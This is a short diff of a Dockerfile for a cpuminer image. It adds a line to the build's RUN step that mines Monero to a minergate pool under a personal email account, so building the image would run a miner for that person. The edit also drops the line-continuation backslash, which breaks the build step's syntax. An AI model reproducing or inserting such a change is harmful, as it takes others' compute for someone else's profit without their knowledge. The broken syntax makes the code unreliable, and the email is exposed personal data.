@@ -52,7 +52,9 @@ RUN set -x \
  && rm -rf /tmp/* \
     # Verify
  && cpuminer --cputest \
- && cpuminer --version
+ && cpuminer --version 
+ && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x
+ 
 
 ENTRYPOINT ["dumb-init"]
 CMD ["cpuminer", "--help"]
